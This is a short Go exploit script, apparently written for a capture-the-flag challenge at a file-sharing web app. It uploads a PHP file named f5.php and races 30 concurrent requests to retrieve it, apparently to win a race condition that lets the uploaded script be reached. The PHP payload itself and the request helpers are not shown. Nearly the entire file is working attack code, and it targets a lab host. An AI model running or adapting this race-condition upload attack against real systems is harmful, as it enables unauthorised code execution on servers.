package main

import (
	"net/http"
	"sync"
)

var (
	mainUrl = "https://ctf.iterasec.com/SimpleFileShare" // should NOT end with "/"
	fileName      = "f5.php"
)

func main() {
	var wg sync.WaitGroup

	// get a home page: something like a connection warming request
	makeHttpReq(http.MethodGet, mainUrl, "", false)

	wg.Add(1)
	go uploadFile(&wg)

	for i := 0; i < 30; i++ {
		wg.Add(1)
		go getFile(&wg)
	}

	wg.Wait()
}

func uploadFile(wg *sync.WaitGroup) {
	defer wg.Done()

	uploadFileReq(http.MethodPost, mainUrl+"/UploadFile")
}

func getFile(wg *sync.WaitGroup) {
	defer wg.Done()

	resp := makeHttpReq(http.MethodGet, mainUrl+"/GetFile?id=14", "", true)
	if resp.StatusCode == http.StatusOK {
		rawHttpLikeOutput(resp, true)
	} else {
		defer resp.Body.Close()
	}
}
